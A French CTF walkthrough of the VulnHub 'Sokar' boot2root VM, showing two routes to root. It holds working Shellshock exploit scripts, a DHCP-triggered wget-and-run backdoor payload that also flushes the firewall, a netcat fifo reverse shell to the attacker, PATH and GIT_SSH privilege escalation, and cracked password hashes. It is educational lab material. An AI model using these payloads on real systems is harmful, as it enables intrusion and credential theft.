# Solution du CTF Sokar de VulnHub

Après avoir solutionné différentes partie du *CySCA 2014*, j'ai choisi de faire un break en m'orientant vers une compétition qui était alors organisée par *VulnHub*. Ce challenge baptisé [Sokar](https://www.vulnhub.com/entry/sokar-1,113/) est un *boot2root*, c'est à dire qu'il faut parvenir à obtenir les droits root sur la machine pour attraper le flag.  

Kansas City Shuffle (la version courte)
---------------------------------------

Quand vous résolvez en une journée un CTF présenté comme une compétition difficile qui s'étend sur une période de 3 semaines c'est généralement que vous avez fait un [Kansas City Shuffle](https://www.youtube.com/watch?v=ag31JHU8LPU).  

Ce n'était de toute évidence pas la façon dont les organisateurs pensaient que ce serait résolu du coup j'ai redonné une chance plus tard à *Sokar* pour suivre le vrai cheminement qui est plus intéressant mais commençons d'abord par cette solution rapide.  

Un scan Nmap rapide ne dévoile aucun port ouvert (le scan rapide ne teste que les ports les plus utilisés), tous les ports testés sont derrière un firewall :  

```plain
# nmap -T4 192.168.1.63

Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-17 22:15 CET
Nmap scan report for 192.168.1.63
Host is up (0.058s latency).
All 1000 scanned ports on 192.168.1.63 are filtered
MAC Address: E8:B1:FC:F1:F9:05 (Intel Corporate)

Nmap done: 1 IP address (1 host up) scanned in 60.13 seconds
```

Comme je n'ai pas eu plus de résultats avec les ports UDP je me suis dit que si je ne peux pas exploiter un serveur alors je peux peut-être exploiter un client.  

Quand la VM se lance on observe un *DHCP Discover* partant de la VM tournant sur un système *CentOS* :  

![Sokar CTF - DHCP Discover](https://raw.githubusercontent.com/devl00p/blog/master/images/sokar/capt1.png)

On remarque aussi qu'une fois que la machine a obtenu un bail DHCP elle fait des requêtes DNS concernant *sokar* en utilisant le serveur DNS de *Google* (8.8.8.8).  

Peut-être que des connexions intéressantes sont faites à destination de *Sokar* donc essayons de les intercepter.  

D'abord on va activer le routage sur notre machine :  

```plain
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Ensuite le traffic DNS qui passe par notre machine nous sera redirigé :  

```plain
iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
```

Tant qu'à faire, si on envoie des réponses autant qu'elles semblent provenir du serveur de destination initiale :  

```plain
iptables -t nat -A POSTROUTING -j MASQUERADE
```

Vous devriez obtenir un état comme celui-ci :  

```plain
# iptables -L -t nat
Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination         
REDIRECT   udp  --  anywhere             anywhere             udp dpt:domain redir ports 53

Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         

Chain POSTROUTING (policy ACCEPT)
target     prot opt source               destination         
MASQUERADE  all  --  anywhere             anywhere
```

Maintenant on va utiliser *Metasploit* pour lancer un serveur DHCP paramêtré à notre avantage (car nous déclarant comme le routeur).  

```plain
msf > use auxiliary/server/dhcp
msf auxiliary(dhcp) > set DHCPIPSTART 192.168.1.62
DHCPIPSTART => 192.168.1.62
msf auxiliary(dhcp) > set DHCPIPEND 192.168.1.100
DHCPIPEND => 192.168.1.100
msf auxiliary(dhcp) > set NETMASK 255.255.255.0
NETMASK => 255.255.255.0
msf auxiliary(dhcp) > set ROUTER 192.168.1.3
ROUTER => 192.168.1.3
msf auxiliary(dhcp) > set SRVHOST 192.168.1.3
SRVHOST => 192.168.1.3
msf auxiliary(dhcp) > exploit
[*] Auxiliary module execution completed
msf auxiliary(dhcp) > 
[*] Starting DHCP server...
```

On laisse le serveur DHCP en tache de fond et on lance un faux serveur DNS qui répondra par notre adresse pour le nom *sokar* :  

```plain
msf auxiliary(dhcp) > back
msf > use auxiliary/server/fakedns
msf auxiliary(fakedns) > set TARGETHOST 192.168.1.3
TARGETHOST => 192.168.1.3
msf auxiliary(fakedns) > set TARGETDOMAIN sokar
TARGETDOMAIN => sokar
msf auxiliary(fakedns) > set TARGETACTION FAKE
TARGETACTION => FAKE
msf auxiliary(fakedns) > exploit
[*] Auxiliary module execution completed
msf auxiliary(fakedns) > 
[*] DNS server initializing
[*] DNS server started
```

Voilà, voilà... On reboot la VM et cette fois :  

```plain
[*] 192.168.1.63:55310 - DNS - DNS target domain found: sokar
[*] 192.168.1.63:55310 - DNS - DNS target domain sokar faked
[*] 192.168.1.63:55310 - DNS - XID 14390 (IN::A sokar)
[*] 192.168.1.63:40661 - DNS - DNS target domain found: sokar
[*] 192.168.1.63:40661 - DNS - DNS target domain sokar faked
[*] 192.168.1.63:40661 - DNS - XID 59318 (IN::A sokar)
[*] 192.168.1.63:40661 - DNS - XID 61056 (IN::AAAA sokar, UNKNOWN IN::AAAA)
[*] 192.168.1.63:58504 - DNS - XID 16266 (IN::PTR 3.1.168.192.in-addr.arpa)
[*] 192.168.1.63:54839 - DNS - DNS target domain found: sokar
[*] 192.168.1.63:54839 - DNS - DNS target domain sokar faked
[*] 192.168.1.63:54839 - DNS - XID 28479 (IN::A sokar)
[*] 192.168.1.63:54839 - DNS - XID 45067 (IN::AAAA sokar, UNKNOWN IN::AAAA)
[*] 192.168.1.63:41065 - DNS - XID 55708 (IN::PTR 3.1.168.192.in-addr.arpa)
```

Tout se passe bien comme prévu... sauf qu'il n'y a pas de cocktail surprise :( Aucune autre connexion n'est tentée par la VM.  

![Sokar - DNS hijack](https://raw.githubusercontent.com/devl00p/blog/master/images/sokar/capt2.png)

Puisqu'un client DHCP tourne sur la machine j'ai choisi de m'orienter vers la faille [Shellshock](http://d4n3ws.polux-hosting.com/2014/09/24/vulnerabilite-dans-bash/) qui concerne aussi DHCP.  

Après avoir mis fin au faux serveur DHCP je configure le module *Metasploit* qui nous intéresse :  

```plain
msf > use exploit/unix/dhcp/bash_environment
msf exploit(bash_environment) > set SRVHOST 192.168.1.3
SRVHOST => 192.168.1.3
msf exploit(bash_environment) > set ROUTER 192.168.1.3
ROUTER => 192.168.1.3
msf exploit(bash_environment) > set NETMASK 255.255.255.0
NETMASK => 255.255.255.0
msf exploit(bash_environment) > set DHCPIPSTART 192.168.1.62
DHCPIPSTART => 192.168.1.62
msf exploit(bash_environment) > set DHCPIPEND 192.168.1.100
DHCPIPEND => 192.168.1.10
msf exploit(bash_environment) > set payload cmd/unix/generic
payload => cmd/unix/generic
msf exploit(bash_environment) > set CMD "iptables -F; wget http://192.168.1.3:8000/tshd -O /tmp/tshd;chmod 755 /tmp/tshd;setsid /tmp/tshd"
CMD => iptables -F; wget http://192.168.1.3:8000/tshd -O /tmp/tshd;chmod 755 /tmp/tshd;setsid /tmp/tshd
```

Ici le payload consiste d'abord à supprimer les règles du pare-feu qui nous embêtent puis à lancer un serveur *tshd*.  

On aura préalablement mit en place un mini serveur HTTP pour que la victime récupère la backdoor.  

Et devinez qui vient diner ce soir ?  

```plain
python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.1.63 - - [17/Feb/2015 22:43:03] "GET /tshd HTTP/1.0" 200 -
```

Il faut attendre un peu avoir de pouvoir profiter de l'attaque car comme on le voit dans la capture réseau l'exécution se fait via une tache cron :  

![Sokar shellshocked via DHCP](https://raw.githubusercontent.com/devl00p/blog/master/images/sokar/capt3.png)

Facile... mais sans grands intérêts.  

```plain
$ ./tsh 192.168.1.63
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# cd /root
sh-4.1# ls
build.c  flag
sh-4.1# cat flag
                0   0
                |   |
            ____|___|____
         0  |~ ~ ~ ~ ~ ~|   0
         |  |   Happy   |   |
      ___|__|___________|___|__
      |/\/\/\/\/\/\/\/\/\/\/\/|
  0   |    B i r t h d a y    |   0
  |   |/\/\/\/\/\/\/\/\/\/\/\/|   |
 _|___|_______________________|___|__
|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|
|                                   |
|     V  u  l  n  H  u  b   ! !     |
| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |
|___________________________________|

=====================================
| Congratulations on beating Sokar! |
|                                   |
|  Massive shoutout to g0tmi1k and  |
| the entire community which makes  |
|         VulnHub possible!         |
|                                   |
|    rasta_mouse (@_RastaMouse)     |
=====================================
```

Au passage dans /root on trouve le code C suivant qui va vous permettre de mieux comprendre l'autre solution :  

```c
#include <stdio.h>
#include <string.h>

void encryptDecrypt(char *input, char *output) {
        char key[] = {'I'};

        int i;
        for(i = 0; i < strlen(input); i++) {
                output[i] = input[i] ^ key[i % (sizeof(key)/sizeof(char))];
        }
}

int main (int argc, char *argv[]) {

        char baseStr[] = "f<:;f+ 'f. =i*%&',i::!sff;&&= :&\"(;d-,?sf;&&=f:,*;,=d9;&#,*=if$'=f:,*;,=d9;&#,*=f";

        char a[2];
        char b[2] = "Y";

        printf("Build? (Y/N) ");
        gets(a);

        if( strcmp(a,b) == 0) {

                char encrypted[strlen(baseStr)];
                encryptDecrypt(baseStr, encrypted);
                setreuid(0, 0);
                system(encrypted);
        }

        else

                printf("OK :(\n");

}
```

Regular hellflip (plus c'est long, plus c'est bon)
--------------------------------------------------

On est pas des manches, on se relève les manches !  

Un scan plus complet nous révèle l’existence d'un port TCP :  

```plain
$ sudo nmap -p1-65535 -T4 192.168.1.63

Starting Nmap 6.40 ( http://nmap.org ) at 2015-02-23 11:48 CET
Nmap scan report for 192.168.1.63
Host is up (0.00043s latency).
Not shown: 65534 filtered ports
PORT    STATE SERVICE
591/tcp open  http-alt
MAC Address: 08:00:27:F2:40:DB (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 584.82 seconds
```

Pas grand chose à voir sur le site mis à part la présence d'un CGI en iframe :  

```plain
$ curl -I http://192.168.1.63:591/
HTTP/1.1 200 OK
Date: Mon, 23 Feb 2015 12:50:25 GMT
Server: Apache/2.2.15 (CentOS)
Last-Modified: Sat, 15 Nov 2014 12:06:36 GMT
ETag: "8f11-f4-507e493c95a58"
Accept-Ranges: bytes
Content-Length: 244
Connection: close
Content-Type: text/html; charset=UTF-8

<html>
<head>
<title>System Stats</title>
</head>
<div align="center">
<body bgcolor="#ff9999">

<h2>Sokar Inc.</h2>
<h4>Internal Stats</h4>
<br />
<iframe frameborder=0 width=800 height=600 src="/cgi-bin/cat"></iframe>

</div>
</body>
</html>
```

La page du CGI affiche une série de lignes qui proviennent de toute évidence de commandes Unix.  

CGI ? Et si on retentait notre chance avec *Shellshock* (c'est à la mode), cette fois en mode web :  

```plain
$ ./bin/wapiti http://192.168.1.63:591/ -m shellshock
Wapiti-2.3.0 (wapiti.sourceforge.net)

 Note
========
Le scan a été sauvegardé dans le fichier /home/devloop/.wapiti/scans/192.168.1.63_591.xml
Vous pouvez l'utiliser pour lancer de futures attaques sans avoir à relancer le scan via le paramètre "-k"
[*] Chargement des modules :
         mod_crlf, mod_exec, mod_file, mod_sql, mod_xss, mod_backup, mod_htaccess, mod_blindsql, mod_permanentxss, mod_nikto, mod_delay, mod_buster, mod_shellshock

[+] Lancement du module shellshock
URL http://192.168.1.63:591/cgi-bin/cat seems vulnerable to Shellshock attack !

Rapport
------
Un rapport a été généré dans le fichier /home/devloop/.wapiti/generated_report
Ouvrez /home/devloop/.wapiti/generated_report/index.html dans un navigateur pour voir ce rapport.
```

[Le module Shellshock que j'ai écrit pour Wapiti](http://devloop.users.sourceforge.net/index.php?article109/wapiti-modules-shellshock-et-buster) (version de dév dispo via SVN) a trouvé une faille.  

En jouant un peu avec la vulnérabilité on remarque que la variable d'environnement *PATH* est très importante dans l'exploitation. Par exemple si on lance *which wget* en ayant spécifié le chemin complet de *which* :  

```plain
/usr/bin/which: no wget in ((null))
```

Partant là dessus j'ai écrit l'exploit suivant :  

```python
import requests
import sys

empty_func = "() { :;}; "
url = sys.argv[1]

while True:
    inject = raw_input("$ ")
    if inject.strip() == "exit":
        break
    cmd = "echo; echo; PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin:/usr/local/sbin " + inject + ";"
    hdrs = {"user-agent": empty_func + cmd}
    r = requests.get(url, headers=hdrs)
    print r.content
```

J'ai privilégié cette technique car contrairement à la solution précédente on ne peut pas se débarrasser facilement du firewall qui bloque aussi le trafic sortant (quoique l'on verra plus tard ;-) )  

L'exploit permet d'avoir une simili invite de commande et s'utilise de cette façon :  

```plain
python xploit.py http://192.168.1.63:591/cgi-bin/cat

$ ls -alR /home

/home:
total 16
drwxr-xr-x.  4 root    root    4096 Dec 30 19:20 .
dr-xr-xr-x. 22 root    root    4096 Feb 23 10:45 ..
drwx------   2 apophis apophis 4096 Jan  2 20:12 apophis
drwxrwxrwx.  2 bynarr  bynarr  4096 Feb 23 14:33 bynarr

/home/bynarr:
total 112
drwxrwxrwx. 2 bynarr bynarr  4096 Feb 23 14:33 .
drwxr-xr-x. 4 root   root    4096 Dec 30 19:20 ..
-rw-------. 1 bynarr bynarr     0 Jan 27 19:30 .bash_history
-rw-r--r--. 1 bynarr bynarr    18 Feb 21  2013 .bash_logout
-rw-r--r--. 1 bynarr bynarr   178 Nov 12 14:26 .bash_profile
-rw-r--r--. 1 bynarr bynarr   124 Feb 21  2013 .bashrc
-rwxr-xr-x  1 root   root     368 Jan 27 19:14 lime
-rw-------  1 root   root   10728 Nov 13 11:45 lime.ko
```

L'utilisateur *bynarr* n'est pas très regardant quand aux droits d'accès sur son répertoire personnel.  

```plain
$ find / -user apophis

/mnt
/home/apophis
/var/spool/mail/apophis

$ find / -user bynarr

/home/bynarr
/home/bynarr/.bash_logout
/home/bynarr/.bashrc
/home/bynarr/.bash_profile
/home/bynarr/.bash_history
/tmp/stats
/var/spool/mail/bynarr

$ id bynarr

uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
```

Intéressant, *bynarr* a un module kernel (qu'on ne peut pas lire) dans son home et est membre d'un groupe baptisé *forensic* (on devine à quoi on va toucher plus tard).  

Dans le fichier *stats* appartenant à l'utilisateur on trouve l'output des commandes utilisées par le CGI :  

```plain
$ cat /tmp/stats

Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address               Foreign Address             State      
tcp        0      1 192.168.1.63:55465          192.168.1.3:32              SYN_SENT    
tcp        0      0 :::591                      :::*                        LISTEN      
tcp        0      0 ::ffff:192.168.1.63:591     ::ffff:192.168.1.3:43160    TIME_WAIT   
tcp        0      0 ::ffff:192.168.1.63:591     ::ffff:192.168.1.3:43161    TIME_WAIT   
tcp        0      0 ::ffff:192.168.1.63:591     ::ffff:192.168.1.3:43158    TIME_WAIT   
tcp        0      0 ::ffff:192.168.1.63:591     ::ffff:192.168.1.3:43159    TIME_WAIT   
udp        0      0 0.0.0.0:68                  0.0.0.0:*                               
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node Path
unix  2      [ ACC ]     STREAM     LISTENING     7013   @/com/ubuntu/upstart
unix  3      [ ]         DGRAM                    8334   /dev/log
unix  2      [ ]         DGRAM                    7156   @/org/kernel/udev/udevd
unix  2      [ ]         DGRAM                    8499   
unix  3      [ ]         DGRAM                    7172   
unix  3      [ ]         DGRAM                    7171   

Linux 2.6.32-504.1.3.el6.x86_64 (sokar)         02/23/2015      _x86_64_        (1 CPU)

avg-cpu:  %user   %nice %system %iowait  %steal   %idle
           0.02    0.00    0.07    0.01    0.00   99.89

Device:            tps   Blk_read/s   Blk_wrtn/s   Blk_read   Blk_wrtn
sda               0.95        10.44         5.98     142210      81368
sdb               0.03         0.20         0.00       2700          0
```

A la fin du fichier on trouve ce qui semble être l'output de la commande *iostat*.  

Que se passe t-il si on place le programme *mount* à l'emplacement */home/bynarr/iostat* (on fait la supposition que *iostat* n'est pas appelé via son chemin absolu) ?  

```plain
$ cat /tmp/stats

Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address               Foreign Address             State      
tcp        0      1 192.168.1.63:60266          192.168.1.3:33              SYN_SENT    
tcp        0      0 :::591                      :::*                        LISTEN      
tcp        0      0 ::ffff:192.168.1.63:591     ::ffff:192.168.1.3:43167    TIME_WAIT   
tcp        0      0 ::ffff:192.168.1.63:591     ::ffff:192.168.1.3:43163    TIME_WAIT   
tcp        0      0 ::ffff:192.168.1.63:591     ::ffff:192.168.1.3:43164    TIME_WAIT   
tcp        0      0 ::ffff:192.168.1.63:591     ::ffff:192.168.1.3:43162    TIME_WAIT   
tcp        0      0 ::ffff:192.168.1.63:591     ::ffff:192.168.1.3:43165    TIME_WAIT   
tcp        0      0 ::ffff:192.168.1.63:591     ::ffff:192.168.1.3:43166    TIME_WAIT   
udp        0      0 0.0.0.0:68                  0.0.0.0:*                               
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node Path
unix  2      [ ACC ]     STREAM     LISTENING     7013   @/com/ubuntu/upstart
unix  3      [ ]         DGRAM                    8334   /dev/log
unix  2      [ ]         DGRAM                    7156   @/org/kernel/udev/udevd
unix  2      [ ]         DGRAM                    8499   
unix  3      [ ]         DGRAM                    7172   
unix  3      [ ]         DGRAM                    7171   

/dev/sda1 on / type ext4 (rw)
proc on /proc type proc (rw)
sysfs on /sys type sysfs (rw)
devpts on /dev/pts type devpts (rw,gid=5,mode=620)
tmpfs on /dev/shm type tmpfs (rw)
/dev/sdb1 on /mnt type vfat (rw,uid=501,gid=502)
none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw)
```

Bingo ! Nos commandes sont bien exécutées en tant que *bynarr* via un mécanisme de tache planifiée.  

Voyons si on peut aller plus loin :  

```plain
$ echo "#!/bin/bash" > /tmp/attack
$ echo "chmod o+r /var/spool/mail/bynarr" >> /tmp/attack
$ echo "sudo -l" >> /tmp/attack
$ cp /tmp/attack /home/bynarr/iostat
```

Une nouvelle piste s'ouvre à nous...  

```plain
Matching Defaults entries for bynarr on this host:
    !requiretty, visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User bynarr may run the following commands on this host:
    (ALL) NOPASSWD: /home/bynarr/lime
```

On est autorisés à lancer le script */home/bynarr/lime* avec les droits de l'utilisateur root.  

Evidemment ce script n'est pas écrasable (faut pas rêver).  

Il s'avère que [LiME](http://d4n3ws.polux-hosting.com/2012/04/20/lime-un-lkm-pour-dumper-la-ram-sous-linux/) est un module kernel permettant de dumper la mémoire vive.  

Le script a le contenu suivant :  

```bash
#!/bin/bash
echo """
==========================
Linux Memory Extractorator
==========================
"
echo "LKM, add or remove?"
echo -en "> "

read -e input

if [ $input == "add" ]; then

        /sbin/insmod /home/bynarr/lime.ko "path=/tmp/ram format=raw"

elif [ $input == "remove" ]; then

        /sbin/rmmod lime

else

        echo "Invalid input, burn in the fires of Netu!"

fi
```

Il faut parvenir à le faire exécuter en sachant qu'il lit l'action choisie sur l'entrée standard :  

```plain
$ echo "#!/bin/bash" > /tmp/attack
$ echo 'if [ ! -f /tmp/ram ]; then echo add | sudo /home/bynarr/lime; fi' >> /tmp/attack
$ cp /tmp/attack /home/bynarr/iostat
```

On voit le fichier */tmp/ram* apparaître et grossir pour atteindre sa taille définitive :  

```plain
$ ls -lh /tmp/ram

-r--r--r-- 1 root root 256M Feb 23 15:04 /tmp/ram
```

Après avoir compressé le dump réduit à 40Mo on peut le récupérer assez facilement en exploitant shellshock directement via curl :  

```plain
curl -A '() { :;}; echo; echo; /usr/bin/base64 /tmp/ram.tar.bz2;' http://192.168.1.63:591/cgi-bin/cat > out
```

Dans le dump on trouve notamment l'entrée crontab qui explique la faille :  

```plain
Feb 23 13:48:01 sokar CROND[4167]: (bynarr) CMD (/bin/bash -l -c 'source ~/.bash_profile; /bin/netstat -an 2>&1 > /tmp/stats; printf "\n" >> /tmp/stats; iostat 2>&1 >> /tmp/stats' > /dev/null)
```

Et en cherchant les caractères *$6$* on trouve deux hashs :  

```plain
$6$ZEMP4rDiYsxlJz4h$boaXcV1Jn5o7VVI0REPHzSFUfYYjugTKez9SuMAGj68dhiUsNEJWBcM19mHMfqm6L422ePhAnRj.irCccHtPU1:::::::
$6$UVZfMym7$9FFtl9Ky3ABFGErQlpQsKNOmAycJn4MlSRVHsSgVupDstQOifqqu3LvGwf3wmBvmfvh0IslwMo4/mhZ3qnVrM/:::::::
```

Via *John The Ripper* j'ai pu en casser un qui s'avère appartenir... à *bynarr* (U m4d br0?)  

```plain
bynarr:fruity:::::::
```

Au passage je note que le fichier /etc/resolv.conf est world-writable :  

```plain
$ find /etc -writable

/etc/resolv.conf

$ cat /etc/resolv.conf

nameserver 8.8.8.8
```

Petite aparté pour vous indiquer que j'ai essayé d'utiliser *Volatility* pour analyser le dump ram en suivant la procédure de compilation basée sur *dwarfdump* qui est quasi incompilable et qui nécessite de disposer des sources / entêtes du kernel et tout le tralala....  

Le masochisme à ses limites... PLUS JAMAIS ! JAMAIS ! *\*rire maniaque avec les orbites vides\**  

Du coup j'ai plutôt choisi de provoquer le chargement en mémoire du */etc/shadow* en appelant sudo de cette façon avant de décharger / recharger le module *LiME* :  

```plain
echo test | sudo -S -u apophis id
```

Et cette fois la pêche est bonne :  

```plain
root:$6$cWQYjirZ$rADNjUFSiHmYp.UVdt4WYlmALhMXdkg9//9yuodQ2TFfiEWlAO0J6PRKesEfvu.3dfDb.7gTGgl/jesvFWs7l0:16434:0:99999:7:::
bynarr:$6$UVZfMym7$9FFtl9Ky3ABFGErQlpQsKNOmAycJn4MlSRVHsSgVupDstQOifqqu3LvGwf3wmBvmfvh0IslwMo4/mhZ3qnVrM/:16434:0:99999:7:::
apophis:$6$0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
```

Le mot de passe d'apophis (*overdrive*) se casse facilement avec la wordlist de RockYou.  

Pour m'aider dans mes aventures Sokariennes j'ai écrit le programme suivant permettant d'uploader un fichier via Shellshock :  

```python
import requests
import sys
from base64 import b64encode as b64

fd = open(sys.argv[1])

def do_cmd(cmd):
    empty_func = "() { :;}; echo; echo; PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin:/usr/local/sbin "
    hdrs = {"user-agent": empty_func + cmd + ";"}
    r = requests.get("http://192.168.1.63:591/cgi-bin/cat", headers=hdrs)

do_cmd("rm /tmp/temp_data.txt")

while True:
    buff = fd.read(57)
    if not buff:
        break
    data = b64(buff)
    cmd = "echo {0} >> {1}".format(data, "/tmp/temp_data.txt")
    do_cmd(cmd)

do_cmd("base64 -d /tmp/temp_data.txt > /tmp/out")
fd.close()
```

Et j'ai aussi écrit un script Python qui lance des commandes en tant que apophis via su dans un pseudo-terminal :  

```python
import pty
import os
import sys

cmd = " ".join(sys.argv[1:])
child_pid, child_fd = pty.fork()

if not child_pid: # child process
    os.execv("/bin/su", ["su", "-c", cmd + ";echo END", "apophis"])
else:
    buff = os.read(child_fd, 1000)
    os.write(child_fd, "overdrive\n")
    s = ""
    while not s.endswith("END"):
        s += os.read(child_fd, 1)
    print s
```

Et le miracle s'accomplit :  

```plain
$ python /tmp/do_su.py ls -alR /home/apophis

/home/apophis:
total 32
drwx------  2 apophis apophis 4096 Jan  2 20:12 .
drwxr-xr-x. 4 root    root    4096 Dec 30 19:20 ..
-rw-------  1 apophis apophis    0 Jan 15 21:15 .bash_history
-rw-r--r--  1 apophis apophis   18 Feb 21  2013 .bash_logout
-rw-r--r--  1 apophis apophis  176 Feb 21  2013 .bash_profile
-rw-r--r--  1 apophis apophis  124 Feb 21  2013 .bashrc
-rwsr-sr-x  1 root    root    8430 Jan  2 17:49 build
END
```

Next-step : le binaire build qui est setuid root :)  

Après avoir modifié les droits d'accès sur le home d'apophis (de ?) j'ai récupéré le binaire *build* via la même technique que pour le dump mémoire.  

Le binaire correspond au fait au code C vu sur la première solution. Ce dernier utilise la fonction *gets()* bien connue pour être dangereuse mais la randomisation de la pile, le fait que l'on est sur un système 64bits et la présence de canaries sur la pile rendent l'exploitation impraticable... Il faut voir ailleurs.  

```plain
$ ltrace -s 256 ./build 
__libc_start_main([ "./build" ] <unfinished ...>
__printf_chk(1, 0x7fe39e1ebb6c, 0x7fff43049ef8, 0) = 13
__gets_chk(0x7fff43049de0, 2, 13, 0xfbad2a84Build? (Y/N) Y
) = 0x7fff43049de0
strcmp("Y", "Y") = 0
setreuid(0, 0) = -1
system("/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/"fatal: impossible de créer le répertoire de la copie de travail '/mnt/secret-project'.: Permission non accordée
 <no return ...>
--- SIGCHLD (Le processus fils a terminé) ---
<... system resumed> ) = 32768
__cxa_finalize(0x7fe39e3ebc78, 0, 3, 1) = 0x7fe39dfc4070
+++ exited (status 0) +++
```

Et ailleurs c'est visiblement git car c'est ce qu'il se cache derrière la chaîne C que l'on avait vu sous forme obfusquée.  

Entre temps, un éclair de lucidité (ou de génie, n'ayons pas peur des mots :D ) m'a poussé à utiliser IPv6 pour passer le firewall.  

*Netcat* est installé sur la machine mais la version ne dispose pas de l'option -e, il faut donc créer un tube nommé (une fifo selon *William Shakespeare*) :  

```plain
mkfifo /tmp/f
cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc -6 fe80::ca60:ff:fec9:52af%eth0 9999 >/tmp/f
```

Et côté attaquant on lance nonchalamment *ncat*, le couteau suisse du 21ème siècle :  

```plain
$ ncat -6 -l -v 9999
Ncat: Version 6.01 ( http://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Connection from fe80::a00:27ff:fef2:40db.
Ncat: Connection from fe80::a00:27ff:fef2:40db:59170.
sh: no job control in this shell
sh-4.1$ export PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin:/usr/local/sbin
<sr/bin:/usr/local/bin:/sbin:/usr/sbin:/usr/local/sbin                       
sh-4.1$ which python
which python
/usr/bin/python
sh-4.1$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.1$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-4.1$ su apophis
su apophis
Password: overdrive

[apophis@sokar bynarr]$ id
id
uid=501(apophis) gid=502(apophis) groups=502(apophis)
```

Déjà on a un shell qui sans être extra est plus réaliste :)  

Comme la commande *git clone* cherche à contacter un serveur baptisé *sokar-dev* on va profiter de l'accès en écriture à *resolv.conf* pour nous définir comme serveur DNS :  

```plain
nameserver fe80::ca60:ff:fec9:52af
nameserver 192.168.0.3
```

J'ai remarqué que pour que la résolution fonctionne il faut mettre une adresse IPv6 ET une adresse IPv4...  

Et enfin via *dnschef* on répond à chaque requête DNS avec notre adresse IP (ici seuls les enregistrements A et AAAA nous intéressent).  

```plain
# python dnschef.py -6 -i ::0  --fakeip 192.168.1.3 --fakeipv6 fe80::ca60:ff:fec9:52af --logfile=blah
          _                _          __  
         | | version 0.3  | |        / _| 
       __| |_ __  ___  ___| |__   ___| |_ 
      / _` | '_ \/ __|/ __| '_ \ / _ \  _|
     | (_| | | | \__ \ (__| | | |  __/ |  
      \__,_|_| |_|___/\___|_| |_|\___|_|  
                   iphelix@thesprawl.org  

[*] Using IPv6 mode.
[*] DNSChef started on interface: ::0 
[*] Using the following nameservers: 2001:4860:4860::8888
[*] Cooking all A replies to point to 192.168.1.3
[*] Cooking all AAAA replies to point to fe80::ca60:ff:fec9:52af
[18:50:31] ::ffff:192.168.1.63: cooking the response of type 'A' for sokar-dev to 192.168.1.3
[18:50:32] ::ffff:192.168.1.63: cooking the response of type 'AAAA' for sokar-dev to fe80::ca60:ff:fec9:52af
```

La résolution fonctionne, encore faut-il pouvoir faire quelque chose d'intéressant avec le dépôt git que l'on aura préalablement créé.  

Les permissions setuid sur les fichiers sont droppées lors du git-clone et l'info sur le propriétaire initial aussi, sans doute à cause des options de montage de */mnt*.  

En fouillant dans la page de manuel de *git* et *git-clone* j'ai relevé des variables d'environnement potentiellement attaquables : *GIT\_TEMPLATE\_DIR*, *GIT\_EXEC\_PATH*, *GIT\_SSH* et *GIT\_ASKPASS*.  

L'idée derrière *GIT\_EXEC\_PATH* était de faire une copie de */usr/lib/git/* et de mettre un faux *git-clone* dans la copie du dossier... Sans résultat.
La variable *GIT\_ASKPASS* permet de spécifier une commande qui aurait du se lancer lors de la saisie des identifiants SSH... mais ça n'a pas marché non plus.  

En revanche avec *GIT\_SSH* on parvient à exécuter nos commandes (notre script ne doit pas générer d'output car git le lance via un pipe et analyse la sortie). Autre avantage : la commande s'exécute même si on n'a pas créé de dépôt auparavant.  

```plain
[apophis@sokar ~]$ echo '#!/bin/bash' > cmd
[apophis@sokar ~]$ echo 'cp /root/flag* /tmp' >> cmd
[apophis@sokar ~]$ echo 'chmod 777 /tmp/flag*' >> cmd
[apophis@sokar ~]$ GIT_SSH=/home/apophis/cmd ./build
GIT_SSH=/home/apophis/cmd ./build
Build? (Y/N) Y
Y
Cloning into '/mnt/secret-project'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
[apophis@sokar ~]$ cat /tmp/flag
cat /tmp/flag
                0   0
                |   |
            ____|___|____
         0  |~ ~ ~ ~ ~ ~|   0
         |  |   Happy   |   |
      ___|__|___________|___|__
      |/\/\/\/\/\/\/\/\/\/\/\/|
  0   |    B i r t h d a y    |   0
  |   |/\/\/\/\/\/\/\/\/\/\/\/|   |
 _|___|_______________________|___|__
